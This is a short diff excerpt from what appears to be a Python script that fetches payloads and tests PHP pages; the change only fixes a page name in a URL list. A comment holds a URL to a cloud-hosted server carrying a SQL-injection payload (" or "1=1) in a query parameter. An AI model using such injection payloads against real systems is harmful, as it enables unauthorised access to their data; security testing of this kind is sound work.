@@ -99,8 +99,7 @@ if __name__ == "__main__":
 	
 	## check all pages
 	payloads = get_payloads()
-	url_list = ['/selections.php',
-	'/princecss.php']
+	url_list = ['/selections.php','/princess.php']
 
 # http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080/selections.php?years=%22%20or%20%221=1
 
